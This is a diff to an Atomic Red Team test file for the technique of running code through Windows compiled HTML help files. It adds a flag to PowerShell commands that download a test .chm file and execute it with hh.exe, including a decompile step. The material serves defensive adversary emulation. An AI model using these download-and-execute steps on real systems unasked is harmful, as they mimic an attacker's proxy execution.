@@ -21,7 +21,7 @@ atomic_tests:
       if (Test-Path "#{local_chm_file}") {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory (split-path "#{local_chm_file}") -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.001/src/T1218.001.chm" -OutFile "#{local_chm_file}"
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.001/src/T1218.001.chm" -OutFile "#{local_chm_file}" -UseBasicParsing
   executor:
     command: |
       hh.exe "#{local_chm_file}"
@@ -208,7 +208,7 @@ atomic_tests:
       if (Test-Path "#{local_chm_file}") {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory (split-path "#{local_chm_file}") -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.001/src/T1218.001.chm" -OutFile "#{local_chm_file}"
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.001/src/T1218.001.chm" -OutFile "#{local_chm_file}" -UseBasicParsing
   executor:
     command: |
       hh.exe -decompile %temp% "#{local_chm_file}"
